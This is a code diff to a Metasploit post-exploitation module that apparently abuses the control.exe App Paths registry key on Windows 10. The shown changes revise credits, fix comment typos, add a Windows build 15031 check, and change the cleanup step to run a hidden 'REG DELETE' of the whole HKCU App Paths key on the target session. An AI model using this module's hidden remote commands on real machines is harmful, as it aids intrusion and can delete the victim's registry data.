@@ -117,9 +117,9 @@ class MetasploitModule < Msf::Post
                         'License'       => UNKNOWN_LICENSE,
                         'Author'        =>
                                 [
-                                        'Module Author: pedr0 Ubuntu [r00t-3xp10it]', # post-module author
-                                        'Vuln discover: enigma0x3 | mattifestation',  # POC/vuln credits
-                                        'Specialthanks: 0xyg3n [SSA Red Team]',       # help debugging
+                                        'Module Author : pedr0 Ubuntu [r00t-3xp10it]', # post-module author
+                                        'Vuln discover : enigma0x3 | mattifestation',  # POC/vuln credits
+                                        'Special thanks: 0xyg3n [SSA Red Team]',       # help debugging
                                 ],
  
                         'Version'        => '$Revision: 1.5',
@@ -284,8 +284,7 @@ def ls_clean
 
   r=''
   session = client
-  value = "/ve /t REG_SZ /f" # registry key default value ..
-  reg_clean = "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\App Paths\\control.exe" # registry hive to be cleaned ..
+  reg_clean = "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\App Paths" # registry hive to be cleaned ..
   # 
   # check for proper config settings enter
   # to prevent 'unset all' from deleting default options ..
@@ -320,8 +319,8 @@ def ls_clean
       # Revert hijacking registry key from target regedit ..
       #
       print_good(" exec => Reverting control.exe hijack reg key ..")
-      r = session.sys.process.execute("cmd.exe /c REG ADD \"#{reg_clean}\" #{value}", nil, {'Hidden' => true, 'Channelized' => true})
-      print_good(" exec => cmd.exe /c REG ADD \"#{reg_clean}\" #{value}")
+      r = session.sys.process.execute("cmd.exe /c REG DELETE \"#{reg_clean}\" /f", nil, {'Hidden' => true, 'Channelized' => true})
+      print_good(" exec => REG DELETE \"#{reg_clean}\" /f")
       # give a proper time to refresh regedit
       Rex::sleep(3.0)
 
@@ -416,7 +415,6 @@ def ls_vulncheck
   print_line("    HIJACK_HIVE : #{vuln_stats}")
   print_line("    VULN_STATUS : #{report_tw}")
   print_line("")
-  print_line("")
   Rex::sleep(1.0)
 end
 
@@ -458,16 +456,23 @@ def run
     # the 'def check()' funtion that rapid7 requires to accept new modules.
     # Guidelines for Accepting Modules and Enhancements:https://goo.gl/OQ6HEE
     #
-    # check for proper operative system (windows-not-wine)
+    # check for proper operating system (windows-not-wine)
     if not oscheck == "Windows_NT"
       print_error("[ ABORT ]: This module only works againts windows systems")
       return nil
     end
     #
-    # check for proper operative system (windows 10)
+    # check for proper operating system (windows 10)
     #
     if not sysinfo['OS'] =~ /Windows 10/
       print_error("[ ABORT ]: This module only works againt windows 10 systems")
+      return nil
+    end
+    #
+    # check for correct version build
+    #
+    if not sysinfo['OS'] =~ /(Build 15031)/
+      print_error("[ ABORT ]: This module only works againt Build 15031")
       return nil
     end
     #
